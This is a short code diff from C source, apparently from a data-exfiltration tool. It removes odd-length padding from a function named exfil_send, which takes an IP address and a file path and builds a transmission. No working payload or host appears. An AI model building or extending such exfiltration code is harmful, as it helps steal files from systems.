@@ -215,14 +215,6 @@ void exfil_send(uint32 ipaddr, char *path)
 		char *trans;
 		int tot_len;
 
-		// Pad non-even sequences with a space ...
-		if (buflen % 2 != 0)
-		{
-			buffer[buflen - 1] = ' ';
-			buffer[buflen] = 0;
-			++buflen;
-		}
-
 		tot_len = buflen + 1;
 
 		trans = buildTransmission(buffer, &buflen, XFL_TYP);
